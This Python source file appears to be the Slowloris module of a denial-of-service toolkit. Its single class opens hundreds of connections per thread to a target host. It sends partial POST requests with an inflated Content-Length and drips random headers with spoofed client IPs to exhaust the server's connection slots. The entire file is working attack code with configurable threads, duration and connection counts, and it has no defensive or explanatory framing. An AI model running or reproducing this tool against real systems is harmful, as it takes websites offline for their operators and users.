#!/usr/bin/env python3
"""
Slowloris Vector
Keep connections open by sending partial headers slowly
"""

import socket
import ssl
import random
import time
import threading
from typing import Optional, List
from ironcarrier.core.stats import StatsCollector


class Attack:
    """Slowloris attack vector"""
    
    HEADERS_POOL = [
        'X-A-{name}: {value}',
        'X-B-{name}: {value}',
        'X-C-{name}: {value}',
        'Accept-{name}: {value}',
        'Cache-{name}: {value}',
        'Content-{name}: {value}',
        'Custom-{name}: {value}',
        'Pragma: no-cache',
        'X-Forwarded-For: {ip}',
        'X-Real-IP: {ip}',
        'X-Client-IP: {ip}',
        'X-Originating-IP: {ip}',
    ]
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 200, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.use_ssl = kwargs.get('ssl', port == 443)
        self.headers_per_interval = kwargs.get('headers_per_interval', 5)
        self.interval = kwargs.get('interval', 15)
        self.max_connections = kwargs.get('max_connections', 500)
        self.timeout = kwargs.get('timeout', 30)
    
    def _random_ip(self) -> str:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _random_string(self, n: int = 8) -> str:
        import string
        return ''.join(random.choices(string.ascii_lowercase, k=n))
    
    def _generate_header(self) -> str:
        """Generate random header line"""
        template = random.choice(self.HEADERS_POOL)
        return template.format(
            name=self._random_string(6),
            value=self._random_string(random.randint(10, 50)),
            ip=self._random_ip()
        )
    
    def _build_initial_request(self) -> bytes:
        """Build initial partial HTTP request"""
        lines = [
            f"POST / HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: 999999",
            f"Keep-Alive: timeout={self.interval + 5}, max=1000",
            f"Connection: keep-alive",
        ]
        return '\r\n'.join(lines) + '\r\n'
    
    def _create_connection(self) -> socket.socket:
        """Create and initialize a slow connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target)
        
        initial = self._build_initial_request().encode()
        sock.sendall(initial)
        self.stats.add_packets(1, len(initial))
        self.stats.add_connection()
        
        return sock
    
    def _attack_thread(self) -> None:
        """Maintain multiple slow connections"""
        connections: List[socket.socket] = []
        end_time = time.time() + self.duration
        last_send = time.time()
        
        while time.time() < end_time and not self.stop_event.is_set():
            # Open new connections up to max
            while len(connections) < self.max_connections and time.time() < end_time:
                try:
                    sock = self._create_connection()
                    connections.append(sock)
                except Exception:
                    self.stats.add_error()
                    time.sleep(0.1)
                    break
            
            # Send headers at interval
            now = time.time()
            if now - last_send >= self.interval:
                last_send = now
                dead = []
                
                for sock in connections:
                    try:
                        for _ in range(self.headers_per_interval):
                            header = self._generate_header() + '\r\n'
                            sock.sendall(header.encode())
                            self.stats.add_packets(1, len(header))
                    except Exception:
                        dead.append(sock)
                
                for sock in dead:
                    try:
                        sock.close()
                    except Exception:
                        pass
                    connections.remove(sock)
            
            time.sleep(0.5)
        
        # Cleanup
        for sock in connections:
            try:
                sock.close()
            except Exception:
                pass
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 10)
